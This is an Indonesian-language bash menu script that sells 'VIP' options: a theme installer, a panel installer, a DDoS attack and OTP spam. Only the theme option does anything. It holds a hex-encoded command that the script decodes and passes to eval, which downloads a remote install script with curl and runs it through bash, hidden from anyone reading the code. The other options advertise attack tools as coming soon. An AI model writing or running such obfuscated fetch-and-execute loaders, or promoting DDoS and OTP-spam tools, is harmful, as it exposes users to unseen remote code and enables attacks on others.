#!/bin/bash

# Definisi warna
BIRU='\033[0;34m'       
MERAH='\033[0;31m'
HIJAU='\033[0;32m'
KUNING='\033[0;33m'
NC='\033[0m'

echo -e "SILAHKAN ISI NAMA ANDA"
read NAMA

display_welcome() {
  echo -e "${BIRU}-----------------------------------------------------${NC}"
  echo -e "${KUNING}NAME : $NAMA${NC}"
  echo -e "${KUNING}STATUS : ONLINE${NC}"
  echo -e "${BIRU}-----------------------------------------------------${NC}"
  echo -e "${KUNING}PAKAILAH SESUKA ANDA${NC}"
  echo -e "${KUNING}NOTE : PEMBELIAN TOKEN BISA LANGSUNG PM${NC}"
  echo -e "${KUNING}-----------------------------------------------${NC}"
  echo -e "${KUNING}NO : 085960349812${NC}"
  echo -e "${KUNING}CREADIT : MARZ OFFC${NC}"
  clear
}

select_display() {
  while true; do
  echo -e "${HIJAU}----------------------------------------------${NC}"
  echo -e "${KUNING}silahkan pilih salah satu dari menu di bawah ini${NC}"
  echo -e "${HIJAU}----------------------------------------------${NC}"
  echo -e "1. instal theme (VIP)"
  echo -e "2. instal panel (VIP)"
  echo -e "3. ddos attack (VIP)"
  echo -e "4. spam otp (VIP)"
  echo -e "x. exit"
  read -r select
  case "$select" in
    1)
      hex_code=62617368203c28206375726c202d732068747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6d61727a7a2d6c61622f6d61727a7a2f6d61696e2f696e7374616c6c2e736829
      command=$(echo "$hex_code" | xxd -r -p)
    eval "$command"
    ;;
    2)
      echo -e "${KUNING}COMING SOON${NC}"
      sleep 3
      clear
    ;;
    3)
      echo -e "${KUNING}COMING SOON${NC}"
      sleep 3
      clear
    ;;
    4)
      echo -e "${KUNING}COMING SOON${NC}"
      sleep 3
      clear
    ;;
    x)
      echo -e "${KUNING}exit to script${NC}"
      exit 0
    ;;
    esac
  done
}

# display
display_welcome
select_display
